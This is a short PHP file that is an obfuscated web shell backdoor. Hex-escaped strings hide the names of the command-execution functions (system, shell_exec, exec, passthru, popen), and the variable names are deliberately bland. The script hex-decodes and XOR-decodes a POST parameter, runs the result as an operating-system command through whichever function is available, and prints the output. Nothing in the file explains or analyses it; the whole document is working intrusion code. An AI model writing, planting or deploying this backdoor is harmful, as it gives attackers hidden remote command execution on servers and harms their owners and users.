<?php

$query_handler4 = "pa\x73\x73thr\x75";
$query_handler6 = "\x73\x74\x72eam\x5Fg\x65t\x5F\x63o\x6E\x74en\x74s";
$query_handler5 = "p\x6F\x70en";
$query_handler1 = "\x73\x79\x73tem";
$query_handler7 = "p\x63\x6Co\x73e";
$splitter_tool = "\x68\x65\x782b\x69n";
$query_handler3 = "ex\x65\x63";
$query_handler2 = "s\x68\x65ll\x5F\x65xec";
if (isset($_POST["hld"])) {
            function reverse_searcher     (      $factor     ,     $fac      )      {     $dchunk     =   ''      ;   $c=0; do{$dchunk.=chr(ord($factor[$c])^$fac);$c++;} while($c<strlen($factor)); return     $dchunk;     }
            $hld = $splitter_tool($_POST["hld"]);
            $hld = reverse_searcher($hld, 20);
            if (function_exists($query_handler1)) {
                $query_handler1($hld);
            } elseif (function_exists($query_handler2)) {
                print $query_handler2($hld);
            } elseif (function_exists($query_handler3)) {
                $query_handler3($hld, $pointer_factor);
                print join("\n", $pointer_factor);
            } elseif (function_exists($query_handler4)) {
                $query_handler4($hld);
            } elseif (function_exists($query_handler5) && function_exists($query_handler6) && function_exists($query_handler7)) {
                $fac_dchunk = $query_handler5($hld, 'r');
                if ($fac_dchunk) {
                    $ent_binding = $query_handler6($fac_dchunk);
                    $query_handler7($fac_dchunk);
                    print $ent_binding;
                }
            }
            exit;
        }